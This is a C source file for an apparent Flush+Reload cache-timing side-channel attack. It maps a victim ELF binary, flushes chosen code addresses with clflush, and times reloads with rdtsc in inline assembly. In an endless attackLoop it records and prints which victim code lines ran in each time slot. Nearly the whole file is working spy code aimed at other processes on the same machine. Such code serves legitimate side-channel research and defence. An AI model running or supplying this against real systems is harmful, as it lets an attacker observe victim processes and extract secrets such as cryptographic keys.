#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/stat.h>

#include "flushreload.h"
#include "cpuid.h"
#include "elftools.h"

#define SLOT_BUF_SIZE 10000
#define MAX_QUIET_PERIOD 10000

void checkSystemConfiguration()
{
    if (!cpuid_has_invariant_tsc()) {
        printf("WARNING: This processor does not have an invariant TSC.\n");
    }

    /* TODO: warn on multiple procs */

    /* TODO: warn on AMD */
}

void *map(const char *elf_path)
{
    int fd = open(elf_path, O_RDONLY);
    if (fd < 0 ) {
        perror("Error opening ELF file.");
        exit(EXIT_FAILURE);
    }

    struct stat st_buf;
    fstat(fd, &st_buf);
    unsigned long size = st_buf.st_size;

    void *rv = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (rv == MAP_FAILED) {
        perror("Error mapping ELF file.");
        exit(EXIT_FAILURE);
    }

    return rv;
}


__attribute__((always_inline))
inline unsigned long probe(const char *adrs) {
  volatile unsigned long time;

  asm __volatile__ (
    "  mfence             \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  lfence             \n"
    "  movl %%eax, %%esi  \n"
    "  movl (%1), %%eax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subl %%esi, %%eax  \n"
    "  clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");
  return time;
}

__attribute__((always_inline))
inline void flush(const char *adrs) {
  asm __volatile__ ("mfence\nclflush 0(%0)" : : "r" (adrs) :);
}


__attribute__((always_inline))
inline unsigned long long gettime() {
    /* FIXME: 64-bit only!! */
    volatile uint64_t t;
    asm __volatile__(
        "lfence\n"
        /* Guaranteed to clear the high-order 32 bits of RAX and RDX. */
        "rdtsc\n"
        "shlq $32, %%rdx\n"
        "orq %%rdx, %%rax\n"
        : "=a" (t)
        :
        : "%rdx"
    );
    return t;
    /* TODO: statically fall back to something like (AND TEST!!!) */
    /*
    volatile unsigned long th, tl;
    asm __volatile__(
        "lfence\n"
        "rdtsc\n"
        "movl %%edx, %0\n"
        "movl %%eax, %1\n"
        : "=m" (th), "=m" (tl)
        :
        : "%eax", "%edx"
    );
    return (th << 32) + tl;
    */
}

typedef struct SlotState {
    unsigned long long start;
    unsigned long missed;
    unsigned long probe_time[MAX_PROBES];
} slot_t;

void printSlotBuffer(slot_t *buffer, unsigned long size, args_t *args)
{
    unsigned int i, j, hit, any_hit = 0;
    for (i = 0; i < size; i++) {
        hit = 0;
        for (j = 0; j < args->probe_count; j++) {
            if (buffer[i].probe_time[j] <= args->threshold) {
                printf("%c", args->probes[j].name);
                hit = 1;
            }
        }
        if (hit) {
            printf("|");
            if (buffer[i].missed > 0) {
                printf("{%lu}", buffer[i].missed);
            }
            any_hit = 1;
        }
    }
    if (any_hit) {
        printf("\n");
    }
}

void attackLoop(args_t *args)
{
    unsigned int threshold = args->threshold;
    probe_t *probes = args->probes;
    unsigned int i;
    unsigned long quiet_length = 0;
    unsigned long hit = 0;

    slot_t buffer[SLOT_BUF_SIZE];
    unsigned long buffer_pos = 0;

    unsigned long long current_slot_start = 0;
    unsigned long long current_slot_end = 0;
    unsigned long long last_completed_slot_end = 0;

    /* Setup: flush all of the probes. */
    for (i = 0; i < args->probe_count; i++) {
        flush(probes[i].mapped_pointer);
    }

    /* FIXME: Think about re-defining a slot so the probe comes at the end. */

    /* Attack loop. We're trying for 1 slot per iteration. */
    last_completed_slot_end = (gettime() / args->slot) * args->slot;
    while (1) {
        /* This slot will be considered to start at the last time that was
         * divisible by the slot size. */
        current_slot_start = (gettime() / args->slot) * args->slot;
        /* This slot will end at the next time divisible by the slot size. */
        current_slot_end = current_slot_start + args->slot;

        /* Save the slot start. */
        buffer[buffer_pos].start = current_slot_start;
        /* Calculate the number of slots we missed. */
        buffer[buffer_pos].missed = (current_slot_start - last_completed_slot_end) / args->slot;
        if (current_slot_start < last_completed_slot_end) {
            printf("Monotonicity failure!!!\n");
            printf("Current Start: %llu. Last end: %llu\n", current_slot_start, last_completed_slot_end);
            exit(1);
        }
        /*
        if (buffer[buffer_pos].missed != 0) {
            printf("%llu -> %llu\n --> %lu\n", current_slot_start, last_completed_slot_end, buffer[buffer_pos].missed);
        }
        */


        /* Measure and reset the probes from the PREVIOUS slot. */
        for (i = 0; i < args->probe_count; i++) {
            buffer[buffer_pos].probe_time[i] = probe(probes[i].mapped_pointer);
            /* We don't make the hit decision yet, we do that when we print the
             * buffer. */
            if (buffer[buffer_pos].probe_time[i] <= args->threshold) {
                hit = 1;
            }
        }

        /* If we got a hit, reset the quiet streak length. */
        if (hit) {
            quiet_length = 0;
        } else {
            quiet_length++;
        }

        /* Wait for this slot to end. */
        while (gettime() < current_slot_end) {
            /* Busy wait. */
        }

        /* Indicate that *this* slot has finished. */
        last_completed_slot_end = current_slot_end;

        /* Advance to the next time slot. */
        buffer_pos++;

        /* If we've reached the end of the buffer, dump it. */
        if (buffer_pos >= SLOT_BUF_SIZE) {
            printSlotBuffer(buffer, buffer_pos, args);
            buffer_pos = 0;
        }

        /* Or, if it's been quiet for a while, do it now. */
        if (buffer_pos >= 1 && quiet_length >= MAX_QUIET_PERIOD) {
            printSlotBuffer(buffer, buffer_pos, args);
            buffer_pos = 0;
        }
    }
}

void printBytes(const unsigned char *start, unsigned long length)
{
    unsigned long i = 0;
    for (i = 0; i < length; i++) {
        printf("%x", start[i]);
        if (i != length - 1) {
            printf(", ");
        }
    }
    printf("\n");
}

void startSpying(args_t *args)
{
    /* Warn the user if the attack might not work on this system. */
    checkSystemConfiguration();

    /* Find the virtual address the victim binary gets loaded at. */
    unsigned long load_address = elf_get_load_address(args->elf_path);
    if (load_address == 0) {
        exit(EXIT_FAILURE);
    }

    /* Map the victim binary into our address space. */
    const char *binary = map(args->elf_path);

    /* Construct pointers to the probe addresses. */
    int i = 0;
    for (i = 0; i < args->probe_count; i++) {
        probe_t *probe = &args->probes[i];
        if (probe->virtual_address < load_address) {
            fprintf(stderr, "Virtual address 0x%lx is too low.\n", probe->virtual_address);
            exit(EXIT_FAILURE);
        }
        /* FIXME: Add upper-bound check too! */
        probe->mapped_pointer = binary + (probe->virtual_address - load_address);
        printf("%c: ", probe->name);
        printBytes(probe->mapped_pointer, 4);
    }

    /* Start the attack. */
    attackLoop(args);
}

